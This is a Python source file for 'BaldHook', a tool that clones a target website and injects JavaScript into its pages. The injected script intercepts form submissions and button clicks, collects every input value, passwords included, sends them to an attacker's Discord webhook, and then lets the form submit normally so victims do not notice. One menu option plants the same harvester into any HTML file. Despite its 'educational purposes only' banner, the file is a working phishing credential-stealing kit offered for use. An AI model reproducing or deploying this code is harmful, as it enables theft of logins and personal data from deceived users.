from colorama import Fore
import colorama
import subprocess
import importlib.util
import sys
import os
def clear():
    if os.name == "posix":
        os.system("clear")
    else:
        os.system("cls")
clear()
colorama.init()

def modulcontrol(package):
    if importlib.util.find_spec(package) is None:
        print(Fore.YELLOW + f"[!]{package} not found, downloading {package}{Fore.CYAN}")
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", package])
            print(Fore.GREEN + f"[+]{package} downloaded successfully")
        except:
            print(Fore.RED + f"[-]An error occurred while downloading {package}. You need to install it manually.")
            exit()

modulcontrol("os")
modulcontrol("requests")
modulcontrol("time")
modulcontrol("pyfiglet")
modulcontrol("signal")
modulcontrol("hashlib")
modulcontrol("re")
from bs4 import BeautifulSoup
import requests
import time
from pyfiglet import Figlet
import hashlib
from urllib.parse import urljoin, urlparse
import signal
import re

def clear():
    if os.name == "posix":
        os.system("clear")
    else:
        os.system("cls")

def slow_print(text):
    for letter in text:
        sys.stdout.write(Fore.MAGENTA + letter)
        sys.stdout.flush()
        time.sleep(0.03)

slow_print("\n[!]Hello! Please use this tool for educational purposes only and do not use it for illegal activities")
time.sleep(1.5)
clear()

def menu():
    menuscr = """                ----------------
                      MENU
                ----------------
     """

    print(Fore.CYAN+menuscr)
    options = f"""
    {Fore.CYAN}[0]Copy And Hook {Fore.YELLOW}(it doesn't work in some websites){Fore.CYAN}
    [1]Only Copy
    [2]Only Hook {Fore.YELLOW}(it doesn't work in some index files){Fore.CYAN}
    [3]Exit
    """
    print(Fore.BLUE+options)
    answer = input(f"\nChoose an option>{Fore.YELLOW}  ")
    if answer == "0":
        clear()

        f = Figlet(font='slant')
        print(Fore.CYAN + f.renderText('BaldHook'))
        print(Fore.YELLOW + "            [+]Written by wqlsz[+]")
        time.sleep(0.5)

        target = input(f"{Fore.YELLOW}Enter the target page> ")
        folderpath = input(f"{Fore.YELLOW}Enter the save path>  ")
        WEBHOOK_URL = input(f"{Fore.YELLOW}Enter the save webhook url> ")

        try:
            if not os.path.exists(folderpath):
                os.makedirs(folderpath)
            filtered_text = re.sub(r'[^a-zA-Z0-9\s]', '', target)
            savepath = os.path.join(folderpath, filtered_text)
            if not os.path.exists(savepath):
                os.makedirs(savepath)

            def download_page(url, savepath):
                try:
                    response = requests.get(url)
                    response.raise_for_status()
                    page_content = response.text
                    soup = BeautifulSoup(page_content, 'html.parser')

            
                    inject_javascript(soup)

                    with open(os.path.join(savepath, 'index.html'), 'w', encoding='utf-8') as file:
                        file.write(soup.prettify())

                    css_path = os.path.join(savepath, 'css')
                    js_path = os.path.join(savepath, 'js')
                    img_path = os.path.join(savepath, 'img')

                    os.makedirs(css_path, exist_ok=True)
                    os.makedirs(js_path, exist_ok=True)
                    os.makedirs(img_path, exist_ok=True)

                    download_assets(soup, savepath, url, css_path, js_path, img_path)

                    with open(os.path.join(savepath, 'index.html'), 'w', encoding='utf-8') as file:
                        file.write(str(soup))

                    print(f'{Fore.GREEN}[+]{url} downloaded successfully.')
                except requests.exceptions.RequestException as e:
                    print(f"{Fore.RED}[!]A request error occurred: {e}")

            def inject_javascript(soup):
                script_content = f"""
                (function() {{
                    function sendToDiscord(data) {{
                        fetch('{WEBHOOK_URL}', {{
                            method: 'POST',
                            headers: {{
                                'Content-Type': 'application/json'
                            }},
                            body: JSON.stringify({{
                                content: data
                            }})
                        }}).then(response => {{
                            console.log("Data sent to Discord: " + data);
                        }}).catch(error => {{
                            console.error("Error sending data to Discord: " + error);
                        }});
                    }}

                    function getFormData(form) {{
                        var data = [];
                        var inputs = form.querySelectorAll('input, textarea, select');
                        inputs.forEach(input => {{
                            var name = input.name || input.id || 'unnamed';
                            var value = input.value || input.placeholder || 'empty';
                            data.push(name + ': ' + value);
                        }});
                        return data.join(', ');
                    }}

                    document.addEventListener('DOMContentLoaded', function() {{
                        document.querySelectorAll('form').forEach(form => {{
                            form.addEventListener('submit', function(event) {{
                                event.preventDefault(); // Prevent the default form submission

                                var formData = getFormData(form);
                                sendToDiscord(formData).then(() => {{
                                    form.submit(); // Submit the form programmatically after sending data
                                }}).catch(error => {{
                                    console.error("Error submitting form: " + error);
                                }});
                            }});
                        }});
                    }});
                }})();
                """
                script_tag = soup.new_tag('script')
                script_tag.string = script_content
                if soup.body:
                    soup.body.append(script_tag)
                else:
                    if not soup.html:
                        soup.insert(0, soup.new_tag('html'))
                    if not soup.head:
                        soup.html.insert(0, soup.new_tag('head'))
                    soup.head.append(script_tag)




            def download_assets(soup, savepath, base_url, css_path, js_path, img_path):
                for css in soup.find_all('link', rel='stylesheet'):
                    href = css.get('href')
                    if href:
                        new_path = download_file(href, css_path, base_url)
                        css['href'] = os.path.relpath(new_path, savepath)

                for script in soup.find_all('script'):
                    src = script.get('src')
                    if src:
                        new_path = download_file(src, js_path, base_url)
                        script['src'] = os.path.relpath(new_path, savepath)

                for img in soup.find_all('img'):
                    src = img.get('src')
                    if src:
                        new_path = download_file(src, img_path, base_url)
                        img['src'] = os.path.relpath(new_path, savepath)

            def download_file(url, savepath, base_url):
                if not url.startswith(('http://', 'https://')):
                    url = urljoin(base_url, url)
                try:
                    response = requests.get(url)
                    response.raise_for_status()
                    file_name = os.path.basename(urlparse(url).path)
                    if len(file_name) > 255:
                        hash_object = hashlib.md5(url.encode())
                        file_name = hash_object.hexdigest() + os.path.splitext(file_name)[1]
                    file_path = os.path.join(savepath, file_name)
                    with open(file_path, 'wb') as file:
                        file.write(response.content)
                    print(f'{Fore.GREEN}[+]{file_name} downloaded successfully.')
                    return file_path
                except requests.exceptions.RequestException as e:
                    print(f'{Fore.RED}[!]A request error occurred: {e}')
                    return None

            download_page(target, savepath)
            print(f"{Fore.CYAN}[--------]Check the results here {savepath}[--------]")
            time.sleep(3)
            clear()
            menu()
        except Exception as e:
            print(f"{Fore.RED} Something went wrong: {e}")

        except KeyboardInterrupt:
            print(Fore.YELLOW + "\nSee you next time ;)")
    elif answer == "1":
        clear()
        f = Figlet(font='slant')
        print(Fore.CYAN + f.renderText('BaldHook'))
        print(Fore.YELLOW + "            [+]Written by wqlsz[+]")
        time.sleep(0.5)

        target = input(f"{Fore.YELLOW}Enter the target page> ")
        folderpath = input(f"{Fore.YELLOW}Enter the save path> ")

        try:
            if not os.path.exists(folderpath):
                os.makedirs(folderpath)
            filtered_text = re.sub(r'[^a-zA-Z0-9\s]', '', target)
            savepath = os.path.join(folderpath, filtered_text)
            if not os.path.exists(savepath):
                os.makedirs(savepath)

            def download_page(url, savepath):
                try:
                    response = requests.get(url)
                    response.raise_for_status()
                    page_content = response.text
                    soup = BeautifulSoup(page_content, 'html.parser')

                    with open(os.path.join(savepath, 'index.html'), 'w', encoding='utf-8') as file:
                        file.write(soup.prettify())

                    css_path = os.path.join(savepath, 'css')
                    js_path = os.path.join(savepath, 'js')
                    img_path = os.path.join(savepath, 'img')

                    os.makedirs(css_path, exist_ok=True)
                    os.makedirs(js_path, exist_ok=True)
                    os.makedirs(img_path, exist_ok=True)

                    download_assets(soup, savepath, url, css_path, js_path, img_path)

                    with open(os.path.join(savepath, 'index.html'), 'w', encoding='utf-8') as file:
                        file.write(str(soup))

                    print(f'{Fore.GREEN}[+]{url} downloaded successfully.')
                except requests.exceptions.RequestException as e:
                    print(f"{Fore.RED}[!]A request error occurred: {e}")

            def download_assets(soup, savepath, base_url, css_path, js_path, img_path):
                for css in soup.find_all('link', rel='stylesheet'):
                    href = css.get('href')
                    if href:
                        new_path = download_file(href, css_path, base_url)
                        css['href'] = os.path.relpath(new_path, savepath)

                for script in soup.find_all('script'):
                    src = script.get('src')
                    if src:
                        new_path = download_file(src, js_path, base_url)
                        script['src'] = os.path.relpath(new_path, savepath)

                for img in soup.find_all('img'):
                    src = img.get('src')
                    if src:
                        new_path = download_file(src, img_path, base_url)
                        img['src'] = os.path.relpath(new_path, savepath)

            def download_file(url, savepath, base_url):
                if not url.startswith(('http://', 'https://')):
                    url = urljoin(base_url, url)
                try:
                    response = requests.get(url)
                    response.raise_for_status()
                    file_name = os.path.basename(urlparse(url).path)
                    if len(file_name) > 255:
                        hash_object = hashlib.md5(url.encode())
                        file_name = hash_object.hexdigest() + os.path.splitext(file_name)[1]
                    file_path = os.path.join(savepath, file_name)
                    with open(file_path, 'wb') as file:
                        file.write(response.content)
                    print(f'{Fore.GREEN}[+]{file_name} downloaded successfully.')
                    return file_path
                except requests.exceptions.RequestException as e:
                    print(f'{Fore.RED}[!]A request error occurred: {e}')
                    return None

            download_page(target, savepath)
            print(f"{Fore.CYAN}[--------]Check the results here {savepath}[--------]")
            time.sleep(3)
            clear()
            menu()
        except Exception as e:
            print(f"{Fore.RED} Something went wrong: {e}")

        except KeyboardInterrupt:
            print(Fore.YELLOW + "\nSee you next time ;)")
    elif answer == "2":
        clear()
        f = Figlet(font='slant')
        print(Fore.CYAN + f.renderText('BaldHook'))
        print(Fore.YELLOW + "            [+]Written by wqlsz[+]")
        time.sleep(0.5)
        targethtml = input(f"{Fore.YELLOW}Your html file> ")
        WEBHOOK_URL = input(f"{Fore.YELLOW}Your webhook url> ")
        javascript_content = f"""
                (function() {{
                    function sendToDiscord(data) {{
                        fetch('{WEBHOOK_URL}', {{
                            method: 'POST',
                            headers: {{
                                'Content-Type': 'application/json'
                            }},
                            body: JSON.stringify({{
                                content: data
                            }})
                        }}).then(response => {{
                            console.log("Data sent to Discord: " + data);
                        }}).catch(error => {{
                            console.error("Error sending data to Discord: " + error);
                        }});
                    }}

                    document.addEventListener('DOMContentLoaded', function() {{
                        document.querySelectorAll('button, input[type="submit"]').forEach(button => {{
                            button.addEventListener('click', function(event) {{
                                var inputs = document.querySelectorAll('input, textarea, select');
                                var data = [];
                                inputs.forEach(input => {{
                                    var name = input.name || input.id || 'unnamed';
                                    var value = input.value || input.placeholder || 'empty';
                                    data.push(name + ': ' + value);
                                }});
                                sendToDiscord(data.join(', '));
                            }});
                        }});
                    }});
                }})();
                """

        
        with open(targethtml, 'r', encoding='utf-8') as file:
            soup = BeautifulSoup(file, 'html.parser')

       
        script_tag = soup.new_tag('script')
        script_tag.string = javascript_content

        if soup.body:
            soup.body.append(script_tag)
        elif soup.head:
            soup.head.append(script_tag)

        
        with open(targethtml, 'w', encoding='utf-8') as file:
            file.write(str(soup))
        print(f"{Fore.GREEN}[+]Script injected successfully into {targethtml}")
        time.sleep(3)
        clear()
        menu()
    elif answer == "3":
        print("See you next time ;)")
        exit()
    else:
        print(Fore.RED+answer+" not found")
        time.sleep(1)
        clear()
        menu()
menu()
